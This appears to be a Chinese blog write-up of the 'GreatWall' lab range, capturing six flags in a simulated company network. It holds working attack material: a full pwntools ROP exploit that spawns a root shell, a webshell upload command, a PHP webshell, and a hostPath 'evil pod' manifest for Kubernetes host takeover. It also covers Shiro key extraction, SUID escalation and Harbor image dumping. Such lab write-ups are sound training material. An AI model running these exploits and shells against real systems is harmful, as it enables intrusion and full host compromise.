---
layout: post
title: GreatWall - 春秋云境
category: [春秋云境]
tags:
    [
        长城杯,
        heapdump,
        新翔 OA,
        disable_functions,
        pwn,
        Kubernetes (K8s),
        pod,
        harbor,
        CVE-2022-46463,
    ]
---

![alt text](https://raw.githubusercontent.com/h0ny/repo/main/images/xMuSJq.png)

靶标介绍：

在这个靶场中，您将扮演一名渗透测试工程师，接受雇佣任务来评估“SmartLink Technologies Ltd.”公司的网络安全状况。 您的任务是首先入侵该公司暴露在公网上的应用服务，然后运用后渗透技巧深入 SmartLink 公司的内部网络。在这个过程中，您将寻找潜在的弱点和漏洞，并逐一接管所有服务，从而控制整个内部网络。靶场中共设置了 6 个 Flag，它们分布在不同的靶机上，您需要找到并获取这些 Flag 作为您的成就目标。

| 内网地址                      | Host or FQDN | 简要描述             |
| ----------------------------- | ------------ | -------------------- |
| 172.28.23.17                  | portal       | thinkphp 5           |
| 172.28.23.33                  |              | shiro + spring + pwn |
| 172.28.23.26 <br> 172.22.14.6 | ubuntu-oa    | ftp + 新翔 OA        |
| 172.22.14.37                  |              | Kubernetes (K8s)     |
| 172.22.14.46                  |              | Harbor + MySQL       |

## flag01 | Tinkphp 5 RCE

利用 thinkphp5 漏洞获取外网主机权限。

![alt text](https://raw.githubusercontent.com/h0ny/repo/main/images/828cddb8b75f1b7d.png)

读取 flag01：

```console
/var/www/html/background/public/ >cat /f1ag01_UdEv.txt
flag01: flag{176f49b6-147f-4557-99ec-ba0a351e1ada}
```

网络信息：

```console
www-data@portal:/var/www/html/background/public$ ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.28.23.17  netmask 255.255.0.0  broadcast 172.28.255.255
        inet6 fe80::216:3eff:fe04:d8b6  prefixlen 64  scopeid 0x20<link>
        ether 00:16:3e:04:d8:b6  txqueuelen 1000  (Ethernet)
        RX packets 2295002  bytes 1111278419 (1.1 GB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 1773127  bytes 993564518 (993.5 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 19504  bytes 5225394 (5.2 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 19504  bytes 5225394 (5.2 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

扫描内网：

```
172.28.23.33:8080 open
172.28.23.26:80 open
172.28.23.33:22 open
172.28.23.26:22 open
172.28.23.26:21 open
[*] WebTitle http://172.28.23.26       code:200 len:13693  title:新翔OA管理系统-OA管理平台
[*] WebTitle http://172.28.23.33:8080  code:302 len:0      title:None 跳转url: http://172.28.23.33:8080/login;jsessionid=A6D759A234CC518C4BD8B6C1ADC4D7EF
[*] WebTitle http://172.28.23.33:8080/login;jsessionid=A6D759A234CC518C4BD8B6C1ADC4D7EF code:200 len:3860   title:智联科技 ERP 后台登陆
[+] ftp 172.28.23.26:21:anonymous
   [->]OASystem.zip
[+] PocScan http://172.28.23.33:8080 poc-yaml-spring-actuator-heapdump-file
[+] PocScan http://172.28.23.33:8080 poc-yaml-springboot-env-unauth spring2
```

## flag03 | Heapdump + Shiro + PWN

### Heapdump + Shiro

访问 ERP 系统，明显的 shiro 特征：

![alt text](https://raw.githubusercontent.com/h0ny/repo/main/images/579e0aa2d8d08c06.png)

并且存在 heapdump 文件 http://172.28.23.33:8080/actuator/heapdump

![alt text](https://raw.githubusercontent.com/h0ny/repo/main/images/88edb413baa8079e.png)

下载后，分析文件获取到 shiro key。

```console
root@kali-server:~# java -jar JDumpSpider-1.1-SNAPSHOT-full.jar heapdump
===========================================
CookieRememberMeManager(ShiroKey)
-------------
algMode = GCM, key = AZYyIgMYhG6/CzIJlvpR2g==, algName = AES

===========================================
```

对 shiro 反序列化进行利用。

![alt text](https://raw.githubusercontent.com/h0ny/repo/main/images/7c94888df3ffcdad.png)

### PWN

用户家目录存在 HashNote 文件。

查看主机开放端口：

```console
/ >netstat -tulnp

Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 0.0.0.0:59696           0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
tcp6       0      0 :::8080                 :::*                    LISTEN      659/java
udp        0      0 127.0.0.1:323           0.0.0.0:*                           -
udp        0      0 127.0.0.53:53           0.0.0.0:*                           -
udp        0      0 172.28.23.33:68         0.0.0.0:*                           -
udp6       0      0 ::1:323                 :::*                                -

(Not all processes could be identified, non-owned process info will not be shown, you would have to be root to see it all.)
```

可以使用 ncat 72.28.23.33:59696 进行连接。

此处知识盲区，exp 来自：https://www.dr0n.top/posts/f249db01/

```python
from pwn import *
context.arch='amd64'

def add(key,data='b'):
    p.sendlineafter(b'Option:',b'1')
    p.sendlineafter(b'Key:',key)
    p.sendlineafter(b'Data:',data)

def show(key):
    p.sendlineafter(b'Option:',b'2')
    p.sendlineafter(b"Key: ",key);

def edit(key,data):
    p.sendlineafter(b'Option:',b'3')
    p.sendlineafter(b'Key:',key)
    p.sendlineafter(b'Data:',data)

def name(username):
    p.sendlineafter(b'Option:',b'4')
    p.sendlineafter(b'name:',username)


p = remote('172.28.23.33', 59696)
# p = process('./HashNote')


username=0x5dc980
stack=0x5e4fa8
ukey=b'\x30'*5+b'\x31'+b'\x44'

fake_chunk=flat({
    0:username+0x10,
    0x10:[username+0x20,len(ukey),\
        ukey,0],
    0x30:[stack,0x10]
    },filler=b'\x00')

p.sendlineafter(b'name',fake_chunk)
p.sendlineafter(b'word','freep@ssw0rd:3')

add(b'\x30'*1+b'\x31'+b'\x44',b'test')   # 126
add(b'\x30'*2+b'\x31'+b'\x44',b'test')   # 127


show(ukey)
main_ret=u64(p.read(8))-0x1e0




rdi=0x0000000000405e7c # pop rdi ; ret
rsi=0x000000000040974f # pop rsi ; ret
rdx=0x000000000053514b # pop rdx ; pop rbx ; ret
rax=0x00000000004206ba # pop rax ; ret
syscall=0x00000000004560c6 # syscall

fake_chunk=flat({
    0:username+0x20,
    0x20:[username+0x30,len(ukey),\
        ukey,0],
    0x40:[main_ret,0x100,b'/bin/sh\x00']
    },filler=b'\x00')

name(fake_chunk.ljust(0x80,b'\x00'))


payload=flat([
    rdi,username+0x50,
    rsi,0,
    rdx,0,0,
    rax,0x3b,
    syscall
    ])

p.sendlineafter(b'Option:',b'3')
p.sendlineafter(b'Key:',ukey)
p.sendline(payload)
p.sendlineafter(b'Option:',b'9')
p.interactive()
```

运行 exp 获取交互式 shell 查看 flag03：

```console
root@kali:~# proxychains4 -q python3 exp.py
[+] Opening connection to 172.28.23.33 on port 59696: Done
[*] Switching to interactive mode
$ whoami
root

$ cat /root/flag_RaYz1/f1ag03.txt
flag03: flag{6a326f94-6526-4586-8233-152d137281fd}
```

## flag02 | 新翔 OA

### FTP anonymous login

ftp 匿名登陆，获取 OA 源码。

```console
root@kali-server:~# ncftp 172.28.23.26 -P 21
NcFTP 3.2.7 (Jan 01, 2024) by Mike Gleason (http://www.NcFTP.com/contact/).
Connecting to 172.28.23.26...
(vsFTPd 3.0.3)
Logging in...
Login successful.
Logged in to 172.28.23.26.
ncftp / >get OASystem.zip
OASystem.zip:                     ETA:   0:00    7.19/  7.19 MB  118.23 kB/s =
OASystem.zip:                     ETA:   0:00    7.19/  7.19 MB   96.45 kB/s =
```

### File Upload

审计源码，存在文件上传漏洞。漏洞源码文件如下：

![alt text](https://raw.githubusercontent.com/h0ny/repo/main/images/7216a718d7eeb779.png)

HTTP 数据包：

![alt text](https://raw.githubusercontent.com/h0ny/repo/main/images/878df1b30a6ded6e.png)

curl 命令：

```
curl -X 'POST' --data-binary 'imgbase64=data:image/php;base64,PD9waHAgcGhwaW5mbygpOw==' 'http://172.28.23.26/uploadbase64.php'
```

### PHP - disable_functions bypass

上传 webshell 后不能正常使用，存在 disable_functions。

> 注：因为 disable 的原因直接使用「哥斯拉」连接会 500，需要使用「蚁剑」连接使用插件 bypass。

![alt text](https://raw.githubusercontent.com/h0ny/repo/main/images/3514ce0cba555215.png)

使用蚁剑中的 disable_functions bypass 插件，并修改 `.antproxy.php` 文件内容。

> 注：使用 post 请求会导致请求出错，需要写一个 get 类型的 webshell `<?php system($_GET['cmd']);?>`，再修改 `.antproxy.php` 文件内容指向这个 get 类型的 webshell 文件。

![alt text](https://raw.githubusercontent.com/h0ny/repo/main/images/c73135b708906fa8.png)

最终获取可以正常执行命令的 shell：

```console
www-data@ubuntu-oa:/var/www/html/OAsystem/upload$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

查询 suid 配置。

![alt text](https://raw.githubusercontent.com/h0ny/repo/main/images/f97c9cdf2b142c49.png)

利用 suid 配置，使用 [base32](https://gtfobins.github.io/gtfobins/base32/#suid) 提权，读取 flag02：

```console
root@kali-server:~# curl 'http://172.28.23.26/upload/.antproxy.php?cmd=base32%20/flag02.txt%20|%20base32%20--decode'
flag02: flag{56d37734-5f73-447f-b1a5-a83f45549b28}
```

### 双网卡主机

```console
www-data@ubuntu-oa:/var/www/html/OAsystem/upload$ ifconfig
eth0      Link encap:Ethernet  HWaddr 00:16:3e:04:c2:c8
          inet addr:172.28.23.26  Bcast:172.28.255.255  Mask:255.255.0.0
          inet6 addr: fe80::216:3eff:fe04:c2c8/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:128019 errors:0 dropped:0 overruns:0 frame:0
          TX packets:55701 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000
          RX bytes:99666251 (99.6 MB)  TX bytes:61715672 (61.7 MB)

eth1      Link encap:Ethernet  HWaddr 00:16:3e:03:7e:3a
          inet addr:172.22.14.6  Bcast:172.22.255.255  Mask:255.255.0.0
          inet6 addr: fe80::216:3eff:fe03:7e3a/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:4887 errors:0 dropped:0 overruns:0 frame:0
          TX packets:4893 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000
          RX bytes:206350 (206.3 KB)  TX bytes:206418 (206.4 KB)

lo        Link encap:Local Loopback
          inet addr:127.0.0.1  Mask:255.0.0.0
          inet6 addr: ::1/128 Scope:Host
          UP LOOPBACK RUNNING  MTU:65536  Metric:1
          RX packets:657 errors:0 dropped:0 overruns:0 frame:0
          TX packets:657 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1
          RX bytes:59084 (59.0 KB)  TX bytes:59084 (59.0 KB)
```

扫描新的网段：

```console
www-data@ubuntu-oa:/tmp$ nohup ./fscan -h 172.22.14.6/24 -hn 172.22.14.6 -np -o /tmp/1.txt >/dev/null 2>&1 &
[4] 24538

www-data@ubuntu-oa:/tmp$ cat 1.txt
172.22.14.46:80 open
172.22.14.37:10250 open
[*] WebTitle http://172.22.14.46       code:200 len:785    title:Harbor
[+] InfoScan http://172.22.14.46       [Harbor]
[*] WebTitle https://172.22.14.37:10250 code:404 len:19     title:None
[+] PocScan http://172.22.14.46/swagger.json poc-yaml-swagger-ui-unauth [{path swagger.json}]
```

## flag04 | Kubernetes (K8s) API Server Unauthenticated

主机 10250 端口开放，该端口为 k8s 的服务端口，扫描目标 k8s 是否存在漏洞。

```console
root@kali-server:~# kube-hunter --remote 172.22.14.37
2024-07-26 23:46:03,959 INFO kube_hunter.modules.report.collector Started hunting
2024-07-26 23:46:03,959 INFO kube_hunter.modules.report.collector Discovering Open Kubernetes Services
2024-07-26 23:46:06,394 INFO kube_hunter.modules.report.collector Found open service "Kubelet API" at 172.22.14.37:10250
2024-07-26 23:46:07,521 INFO kube_hunter.modules.report.collector Found open service "Etcd" at 172.22.14.37:2379
2024-07-26 23:46:09,736 INFO kube_hunter.modules.report.collector Found open service "API Server" at 172.22.14.37:6443
2024-07-26 23:46:10,759 INFO kube_hunter.modules.report.collector Found vulnerability "Unauthenticated access to API" in 172.22.14.37:6443
2024-07-26 23:46:10,770 INFO kube_hunter.modules.report.collector Found vulnerability "K8s Version Disclosure" in 172.22.14.37:6443
2024-07-26 23:46:11,811 INFO kube_hunter.modules.report.collector Found vulnerability "Listing namespaces as anonymous user" in 172.22.14.37:6443
2024-07-26 23:46:12,853 INFO kube_hunter.modules.report.collector Found vulnerability "Listing roles as anonymous user" in 172.22.14.37:6443
2024-07-26 23:46:14,013 INFO kube_hunter.modules.report.collector Found vulnerability "Listing cluster roles as anonymous user" in 172.22.14.37:6443
2024-07-26 23:46:15,127 INFO kube_hunter.modules.report.collector Found vulnerability "Listing pods as anonymous user" in 172.22.14.37:6443

Nodes
+-------------+--------------+
| TYPE        | LOCATION     |
+-------------+--------------+
| Node/Master | 172.22.14.37 |
+-------------+--------------+

Detected Services
+-------------+--------------------+----------------------+
| SERVICE     | LOCATION           | DESCRIPTION          |
+-------------+--------------------+----------------------+
| Kubelet API | 172.22.14.37:10250 | The Kubelet is the   |
|             |                    | main component in    |
|             |                    | every Node, all pod  |
|             |                    | operations goes      |
|             |                    | through the kubelet  |
+-------------+--------------------+----------------------+
| Etcd        | 172.22.14.37:2379  | Etcd is a DB that    |
|             |                    | stores cluster's     |
|             |                    | data, it contains    |
|             |                    | configuration and    |
|             |                    | current              |
|             |                    |     state            |
|             |                    | information, and     |
|             |                    | might contain        |
|             |                    | secrets              |
+-------------+--------------------+----------------------+
| API Server  | 172.22.14.37:6443  | The API server is in |
|             |                    | charge of all        |
|             |                    | operations on the    |
|             |                    | cluster.             |
+-------------+--------------------+----------------------+

Vulnerabilities
For further information about a vulnerability, search its ID in:
https://avd.aquasec.com/
+--------+-------------------+----------------------+----------------------+----------------------+----------------------+
| ID     | LOCATION          | MITRE CATEGORY       | VULNERABILITY        | DESCRIPTION          | EVIDENCE             |
+--------+-------------------+----------------------+----------------------+----------------------+----------------------+
| KHV005 | 172.22.14.37:6443 | Initial Access //    | Unauthenticated      | The API Server port  | b'{"kind":"APIVersio |
|        |                   | Exposed sensitive    | access to API        | is accessible.       | ns","versions":["v1" |
|        |                   | interfaces           |                      |     Depending on     | ],"serverAddressByCl |
|        |                   |                      |                      | your RBAC settings   | ientCIDRs":[{"client |
|        |                   |                      |                      | this could expose    | CIDR":"0.0.0.0/0","s |
|        |                   |                      |                      | access to or control | ...                  |
|        |                   |                      |                      | of your cluster.     |                      |
+--------+-------------------+----------------------+----------------------+----------------------+----------------------+
| KHV002 | 172.22.14.37:6443 | Initial Access //    | K8s Version          | The kubernetes       | v1.16.6-beta.0       |
|        |                   | Exposed sensitive    | Disclosure           | version could be     |                      |
|        |                   | interfaces           |                      | obtained from the    |                      |
|        |                   |                      |                      | /version endpoint    |                      |
+--------+-------------------+----------------------+----------------------+----------------------+----------------------+
| KHV007 | 172.22.14.37:6443 | Discovery // Access  | Listing roles as     | Accessing roles      | ['kubeadm:bootstrap- |
|        |                   | the K8S API Server   | anonymous user       | might give an        | signer-clusterinfo', |
|        |                   |                      |                      | attacker valuable    | 'system:controller:b |
|        |                   |                      |                      | information          | ootstrap-signer',    |
|        |                   |                      |                      |                      | 'extension-          |
|        |                   |                      |                      |                      | apiserver-...        |
+--------+-------------------+----------------------+----------------------+----------------------+----------------------+
| KHV007 | 172.22.14.37:6443 | Discovery // Access  | Listing pods as      | Accessing pods might | [{'name': b'nginx-de |
|        |                   | the K8S API Server   | anonymous user       | give an attacker     | ployment-58d48b746d- |
|        |                   |                      |                      | valuable information | d6x8t', 'namespace': |
|        |                   |                      |                      |                      | b'default'},         |
|        |                   |                      |                      |                      | {'name': b'nginx-    |
|        |                   |                      |                      |                      | deploymen...         |
+--------+-------------------+----------------------+----------------------+----------------------+----------------------+
| KHV007 | 172.22.14.37:6443 | Discovery // Access  | Listing namespaces   | Accessing namespaces | ['default', 'kube-   |
|        |                   | the K8S API Server   | as anonymous user    | might give an        | node-lease', 'kube-  |
|        |                   |                      |                      | attacker valuable    | public', 'kube-      |
|        |                   |                      |                      | information          | system']             |
+--------+-------------------+----------------------+----------------------+----------------------+----------------------+
| KHV007 | 172.22.14.37:6443 | Discovery // Access  | Listing cluster      | Accessing cluster    | ['admin', 'cluster-  |
|        |                   | the K8S API Server   | roles as anonymous   | roles might give an  | admin', 'edit',      |
|        |                   |                      | user                 | attacker valuable    | 'flannel',           |
|        |                   |                      |                      | information          | 'system:aggregate-   |
|        |                   |                      |                      |                      | to-admin',           |
|        |                   |                      |                      |                      | 'system:aggregate-   |
|        |                   |                      |                      |                      | to-edit...           |
+--------+-------------------+----------------------+----------------------+----------------------+----------------------+
```

K8s 集群由于鉴权配置不当，将「system:anonymous」用户绑定到「cluster-admin」用户组，使 6443 端口允许匿名用户以管理员权限向集群内部下发指令。

列出当前所有的 Pod：

```
root@kali-server:~# kubectl --insecure-skip-tls-verify -s https://172.22.14.37:6443/ get pods -o wide
Please enter Username: hony
Please enter Password:
NAME                                READY   STATUS    RESTARTS   AGE    IP            NODE         NOMINATED NODE   READINESS GATES
nginx-deployment-58d48b746d-d6x8t   1/1     Running   3          294d   10.244.0.35   ubuntu-k8s   <none>           <none>
nginx-deployment-58d48b746d-pg4gl   1/1     Running   3          294d   10.244.0.37   ubuntu-k8s   <none>           <none>
nginx-deployment-58d48b746d-s2vwl   1/1     Running   3          294d   10.244.0.34   ubuntu-k8s   <none>           <none>
nginx-deployment-58d48b746d-x26mr   1/1     Running   3          294d   10.244.0.33   ubuntu-k8s   <none>           <none>
```

可以进入指定的 Pod 中，获取控制权限：

```
root@kali-server:~# kubectl --insecure-skip-tls-verify -s https://172.22.14.37:6443/ --namespace=default exec -it nginx-deployment-58d48b746d-d6x8t bash
kubectl exec [POD] [COMMAND] is DEPRECATED and will be removed in a future version. Use kubectl exec [POD] -- [COMMAND] instead.
Please enter Username: hony
Please enter Password:
root@nginx-deployment-58d48b746d-d6x8t:/#
root@nginx-deployment-58d48b746d-d6x8t:/# whoami
root
```

使用如下配置「evil_pod.yaml」创建恶意 Pod，将宿主机的存储将文件或目录挂载到 K8s 集群的 Pod 中：

```yaml
apiVersion: v1
kind: Pod
metadata:
    name: evil-nginx
spec:
    containers:
        - name: evil-container
          image: nginx:1.8
          volumeMounts:
              - mountPath: /mnt
                name: evil-volume
    volumes:
        - name: evil-volume
          hostPath:
              # directory location on host
              path: /
              # this field is optional
              type: Directory
```

> 注：配置文件中，最好使用已有的 image 进行创建，此处使用 `nginx:1.8`。

创建恶意的 Pod：

```console
root@kali-server:~# kubectl --insecure-skip-tls-verify -s https://172.22.14.37:6443/ apply -f evil_pod.yaml
pod/evil-nginx created

root@kali-server:~# kubectl --insecure-skip-tls-verify -s https://172.22.14.37:6443/ get pods -o wide
NAME                                READY   STATUS    RESTARTS   AGE    IP            NODE         NOMINATED NODE   READINESS GATES
evil-nginx                          1/1     Running   0          18s    10.244.0.40   ubuntu-k8s   <none>           <none>
nginx-deployment-58d48b746d-d6x8t   1/1     Running   3          294d   10.244.0.35   ubuntu-k8s   <none>           <none>
nginx-deployment-58d48b746d-pg4gl   1/1     Running   3          294d   10.244.0.37   ubuntu-k8s   <none>           <none>
nginx-deployment-58d48b746d-s2vwl   1/1     Running   3          294d   10.244.0.34   ubuntu-k8s   <none>           <none>
nginx-deployment-58d48b746d-x26mr   1/1     Running   3          294d   10.244.0.33   ubuntu-k8s   <none>           <none>
```

如下，便获取到了宿主机文件系统的权限，此时可以尝试写入计划任务或 SSH 公钥的方式获取宿主机的完全控制权。

读取宿主机上的文件：

```console
root@kali-server:~# kubectl --insecure-skip-tls-verify -s https://172.22.14.37:6443/ --namespace=default exec -it evil-nginx bash
kubectl exec [POD] [COMMAND] is DEPRECATED and will be removed in a future version. Use kubectl exec [POD] -- [COMMAND] instead.
root@evil-nginx:/# id
uid=0(root) gid=0(root) groups=0(root)

root@evil-nginx:~# cat /mnt/root/.mysql_history
_HiStOrY_V2_
show\040databases;
create\040database\040flaghaha;
use\040flaghaha
DROP\040TABLE\040IF\040EXISTS\040`f1ag`;
CREATE\040TABLE\040`flag06`\040(
`id`\040int\040DEFAULT\040NULL,
\040\040`f1agggggishere`\040varchar(255)\040DEFAULT\040NULL
)\040ENGINE=MyISAM\040DEFAULT\040CHARSET=utf8;
CREATE\040TABLE\040`flag06`\040(\040`id`\040int\040DEFAULT\040NULL,\040\040\040`f1agggggishere`\040varchar(255)\040DEFAULT\040NULL\040)\040ENGINE=MyISAM\040DEFAULT\040CHARSET=utf8;
show\040tables;
drop\040table\040flag06;
DROP\040TABLE\040IF\040EXISTS\040`f1ag`;
CREATE\040TABLE\040`flag04`\040(
`id`\040int\040DEFAULT\040NULL,
\040\040`f1agggggishere`\040varchar(255)\040DEFAULT\040NULL
)\040ENGINE=MyISAM\040DEFAULT\040CHARSET=utf8;
CREATE\040TABLE\040`flag04`\040(\040`id`\040int\040DEFAULT\040NULL,\040\040\040`f1agggggishere`\040varchar(255)\040DEFAULT\040NULL\040)\040ENGINE=MyISAM\040DEFAULT\040CHARSET=utf8;
INSERT\040INTO\040`flag`\040VALUES\040(1,\040'ZmxhZ3tkYTY5YzQ1OS03ZmU1LTQ1MzUtYjhkMS0xNWZmZjQ5NmEyOWZ9Cg==');
INSERT\040INTO\040`flag04`\040VALUES\040(1,\040'ZmxhZ3tkYTY5YzQ1OS03ZmU1LTQ1MzUtYjhkMS0xNWZmZjQ5NmEyOWZ9Cg==');
exit
```

进行 base64 解码，获取到 flag04：

```
flag{da69c459-7fe5-4535-b8d1-15fff496a29f}
```

## flag05 | Harbor Unauthorized Access Vulnerability (CVE-2022-46463)

![alt text](https://raw.githubusercontent.com/h0ny/repo/main/images/2e60cc0fc614074d.png)

利用 [CVE-2022-46463](https://github.cosm/404tk/CVE-2022-46463) 漏洞，拉取仓库查找 flag05：

```console
root@kali-server:~# python3 harbor.py http://172.22.14.46/
[*] API version used v2.0
[+] project/projectadmin
[+] project/portal
[+] library/nginx
[+] library/redis
[+] harbor/secret

root@kali-server:~# python3 harbor.py http://172.22.14.46/ --dump harbor/secret --v2
[+] Dumping : harbor/secret:latest
    [+] Downloading : 58690f9b18fca6469a14da4e212c96849469f9b1be6661d2342a4bf01774aa50
    [+] Downloading : b51569e7c50720acf6860327847fe342a1afbe148d24c529fb81df105e3eed01
    [+] Downloading : da8ef40b9ecabc2679fe2419957220c0272a965c5cf7e0269fa1aeeb8c56f2e1
    [+] Downloading : fb15d46c38dcd1ea0b1990006c3366ecd10c79d374f341687eb2cb23a2c8672e
    [+] Downloading : 413e572f115e1674c52e629b3c53a42bf819f98c1dbffadc30bda0a8f39b0e49
    [+] Downloading : 8bd8c9755cbf83773a6a54eff25db438debc22d593699038341b939e73974653

root@kali-server:~# tree | grep f1ag
│   │       │   ├── f1ag05_Yz1o.txt
root@kali-server:~# find . -name f1ag05_Yz1o.txt
./caches/harbor_secret/latest/413e572f115e1674c52e629b3c53a42bf819f98c1dbffadc30bda0a8f39b0e49/f1ag05_Yz1o.txt

root@kali-server:~# cat ./caches/harbor_secret/latest/413e572f115e1674c52e629b3c53a42bf819f98c1dbffadc30bda0a8f39b0e49/f1ag05_Yz1o.txt
flag05: flag{8c89ccd3-029d-41c8-8b47-98fb2006f0cf}
```

## flag06 | Harbor to MySQL

转储 projectadmin 项目。

```console
root@kali-server:~# python3 harbor.py http://172.22.14.46/ --dump project/projectadmin --v2
[+] Dumping : project/projectadmin:latest
    [+] Downloading : 63e9bbe323274e77e58d77c6ab6802d247458f784222fbb07a2556d6ec74ee05
    [+] Downloading : a1ae0db7d6c6f577c8208ce5b780ad362ef36e69d068616ce9188ac1cc2f80c6
    [+] Downloading : 70437571d98143a3479eaf3cc5af696ea79710e815d16e561852cf7d429736bd
    [+] Downloading : ae0fa683fb6d89fd06e238876769e2c7897d86d7546a4877a2a4d2929ed56f2c
    [+] Downloading : 90d3d033513d61a56d1603c00d2c9d72a9fa8cfee799f3b1737376094b2f3d4c
```

项目中存在 ProjectAdmin-0.0.1-SNAPSHOT.jar 文件，解压或反编译 jar 包。

![alt text](https://raw.githubusercontent.com/h0ny/repo/main/images/4e31b9ce7a9d8cea.png)

从 application.properties 配置文件中获取到 MySQL 数据库的连接信息。

![alt text](https://raw.githubusercontent.com/h0ny/repo/main/images/9cfa2949abdbcb34.png)

使用 MDUT 连接 MySQL 进行 UDF 提权即可。

![alt text](https://raw.githubusercontent.com/h0ny/repo/main/images/451656b00d24e094.png)
